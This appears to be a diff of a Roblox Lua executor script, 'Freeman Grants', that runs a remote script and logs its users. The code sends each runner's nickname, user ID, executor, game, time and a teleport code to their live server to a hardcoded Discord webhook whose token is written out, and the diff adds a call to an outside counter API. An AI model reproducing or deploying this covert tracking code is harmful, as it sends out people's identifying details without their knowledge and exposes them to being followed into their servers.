@@ -3,6 +3,7 @@ local P = game:GetService("Players")
 local M = game:GetService("MarketplaceService")
 local ORIG = "https://raw.githubusercontent.com/Freeman4i37/freeman-scriptss/main/freeman-music.lua"
 local WEB = "https://discord.com/api/webhooks/1428042359228071936/nBrMxWbCuQ9VUatcWhoPDFAn4jSvAMdzFHLJ5z3lDCuUHpea-wlXhFCA-BguJRyUZRyD"
+local GLOBAL_API = "https://freemangrants.infinityfree.me/contador.php" -- sua API
 
 local function runOrig()
     pcall(function()
@@ -28,23 +29,13 @@ local function teleportCodeString()
     return string.format('(game:GetService("TeleportService")):TeleportToPlaceInstance(%s, "%s", game.Players.LocalPlayer)', placeId, jobId)
 end
 
-local function getExecCount()
+local function getGlobalExecCount()
     local count = "?"
-    local filename = "freeman_exec_count.txt"
     local ok, res = pcall(function()
-        if readfile and writefile then
-            local actual = 0
-            if isfile and isfile(filename) then
-                local content = readfile(filename)
-                local n = tonumber(content)
-                if n then actual = n end
-            end
-            actual = actual + 1
-            writefile(filename, tostring(actual))
-            count = tostring(actual)
-        end
+        count = game:HttpGet(GLOBAL_API)
+        if not tonumber(count) then count = "?" end
     end)
-    return count
+    return tostring(count)
 end
 
 local function sendWebhook(pl)
@@ -72,23 +63,23 @@ local function sendWebhook(pl)
     local tpcode = teleportCodeString()
     local playerCount = #P:GetPlayers()
     local maxPlayers = game.Players.MaxPlayers or "?"
-    local execCount = getExecCount()
+    local execCount = getGlobalExecCount()
     local embed = {
-    title = "📡 Novo usuário executou o script!",
-    color = 16711680,
-    fields = {
-        {name = "👤 Nick:", value = nick, inline = true},
-        {name = "🆔 ID:", value = uid, inline = true},
-        {name = "🔎 Executor:", value = exec, inline = true},
-        {name = "🏡 Players:", value = tostring(playerCount).." / "..tostring(maxPlayers), inline = true},
-        {name = "🎮 Game:", value = tostring(gname), inline = false},
-        {name = "🕐 Horário:", value = tostring(time), inline = false},
-        {name = "🔑 Código de entrada do servidor (copie e cole no executor para entrar):", value = tpcode, inline = false},
-        {name = "🧑‍💼 N°:", value = execCount, inline = true},
-    },
-    thumbnail = { url = avatar },
-    footer = { text = "Freeman Grants - Log System" }
-}
+        title = "📡 Novo usuário executou o script!",
+        color = 16711680,
+        fields = {
+            {name = "👤 Nick:", value = nick, inline = true},
+            {name = "🆔 ID:", value = uid, inline = true},
+            {name = "🔎 Executor:", value = exec, inline = true},
+            {name = "🏡 Players:", value = tostring(playerCount).." / "..tostring(maxPlayers), inline = true},
+            {name = "🎮 Game:", value = tostring(gname), inline = false},
+            {name = "🕐 Horário:", value = tostring(time), inline = false},
+            {name = "🔑 Código de entrada do servidor (copie e cole no executor para entrar):", value = tpcode, inline = false},
+            {name = "🧑‍💼 N°:", value = execCount, inline = true},
+        },
+        thumbnail = { url = avatar },
+        footer = { text = "Freeman Grants - Log System" }
+    }
     local payload = {embeds = {embed}}
     local body = h:JSONEncode(payload)
     pcall(function()
